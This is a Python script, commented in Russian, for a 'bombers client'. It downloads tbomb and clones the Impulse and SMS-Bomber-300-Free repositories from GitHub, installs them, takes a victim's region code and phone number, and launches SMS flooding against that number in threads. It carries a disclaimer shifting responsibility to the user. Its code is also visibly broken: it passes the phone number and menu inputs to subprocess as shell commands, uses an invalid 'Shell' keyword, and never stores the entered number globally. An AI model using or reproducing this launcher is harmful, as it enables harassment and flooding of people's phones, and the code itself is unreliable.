import subprocess
import os
import getpass
import sys
from threading import Thread
import time
import keyboard
from colorama import Fore, Back

clearmode = '0'
sysname = sys.platform
if sys.platform == 'win32':
    clearmode = 'CLS'
if sys.platform == 'Linux':
    clearmode = 'clear'

checkImpulse = False
check300 = False
def Download():
    time.sleep(5)
    os.mkdir(UP)
    os.chdir(UP)
    print('  \nЗагрузка бомберов...')
    subprocess.call('pip install tbomb', shell=True)
    print('Установлен tbomb')
    if checkImpulse == False:
        subprocess.call(f'git clone https://github.com/LimerBoy/Impulse', shell=True)
        os.chdir(UP + 'Impulse')
        subprocess.call(f'pip install -r requirements.txt', shell=True)
        print('Установлен Impulse')
        os.chdir(UP)
    if check300 == False:
        subprocess.call(f'git clone https://github.com/Ivan-Hacker-700/SMS-Bomber-300-Free', shell=True)
        os.chdir(UP + 'SMS-Bomber-300-Free')
        subprocess.call(f'pip install -r requirements.txt', shell=True)
        print('Установлен SMS-Bomder-300-Free')
        os.chdir(UP)

 #Функция экрана ввода номера телефона 
def main():
    os.chdir(UP)
    print('ver 0.1\n')
    #стоит создать переменные кода региона, номер без региона и полный номер(разные бомберы юзают разный формат ввода номера)
    RC = input(Fore.BLACK + Back.GREEN + 'Введите код Региона без +() -->' + Back.RESET + Fore.RESET)
    num = input(Fore.BLACK + Back.GREEN + 'Введите номер() -->' + Back.RESET + Fore.RESET)

def logo():
    os.system(clearmode)
    print(" ________  _____ ______   ________  ________     ")
    print("|\   __  \|\   _ \  _   \|\   __  \|\   ____\    ")
    print("\ \  \|\  \ \  \\\__\ \  \ \  \|\ /\ \  \___|    ")
    print(" \ \   _  _\ \  \\|__| \  \ \   __  \ \  \       ")
    print("  \ \  \\  \\ \  \    \ \  \ \  \|\  \ \  \____  ")
    print("   \ \__\\ _\\ \__\    \ \__\ \_______\ \_______\ ")
    print("    \|__|\|__|\|__|     \|__|\|_______|\|_______|  ")
    print("re1mu's Main Bombers Client")

num = 0 # номер без кода региона
RC = 0 #Код региона для некоторых видов бомбера
fullnum = str(num) + str(RC)


logo()
print(Fore.RED + 'Download Mode' + Fore.RESET)
time.sleep(2)
name = getpass.getuser()
#для windows установка проходит в корень D:\, с установкой на С:\ проблемы ввиде permission denied
if sys.platform == 'win32':
    UP = 'D:\\BomberClient/'
elif sys.platform == 'linux': 
    UP = '/home/'+ name +'/BomberClient/'
if os.path.isdir(UP):
    logo()
    main()
    if num == 'exit':
        print('выходим из клиента')
        time.sleep(2)
        exit()
    if num == 'debug': #Дебаг режим, предпологается что он будет выводить вводимые пользователем данные и не очищать консоль, clear -x не удаляет прошлые сообщения
        clearmode = 'clear -x'
        print(Back.RED + 'Аварийный Режим' + Back.RESET)
    
    #проверка наличия всех бомберов и установка если такова требуется
    if num == 'check':
       if os.path.isdir(UP + 'Impulse'):
           checkImpulse = True
       else:
        checkImpulse = False
        if os.path.isdir(UP + 'SMS-Bomber-300-Free'):
            check300 = True
        else:
            check300 = False
        Download()

# начало использования бомберов
    else:
        print(Fore.BLACK + Back.YELLOW +    '                             !ВНИМАНИЕ!                          ' + Back.RESET)
        print(Back.YELLOW + name + ', только ты несешь ответственность за эти действия. Я всего ' + Back.RESET)
        print(Back.YELLOW + 'лишь предоставляю возможность увидеть  работу бомберов, и мою тво' + Back.RESET)
        print(Back.YELLOW + 'рческую работу////. Все бомберы настроены на минимальный вред жер' + Back.RESET)
        print(Back.YELLOW + 'твы. Ведь изначально этот скрипт  создавался в  качестве шутки...' + Back.RESET)
        print(Back.YELLOW + 'Я надеюсь ты понимаешь, что сейчас делаешь.' + Back.RESET + Fore.RESET)

        def tbomb():
            #Функция запуска tbomb
            subprocess.call(f'tbomb -sms', shell=True)
            subprocess.call(RC, Shell=True)
            subprocess.call(num, Shell=True)
            subprocess.call(f'100', Shell=True)
            subprocess.call(f'2', Shell=True)
            subprocess.call(f'100', Shell=True)
            keyboard.press('Enter')
        tbombTh = Thread(target=tbomb)
        tbombTh.start()
        def sms300():
            os.chdir(UP + 'SMS-Bomber-300-Free')
            subprocess.call(f'python SMSBomber300', Shell=True)
            subprocess.call(f'1', Shell=True)
            subprocess.call(f'1', Shell=True)
            subprocess.call(f'+' + fullnum, Shell=True)
        sms300Th = Thread(target=sms300)
        sms300Th.start()



#первый запуск скрипта  
else:
    print('  \nПапки клиента не существует, создание папки и установка бомберов')
    Download()
    logo()
    main()










#ссылки на бомберы
    # subprocess.call(f'', shell=True)
    # https://github.com/yyasha/smsbomb
    # https://github.com/K1ngSoul/Parad1seBomb



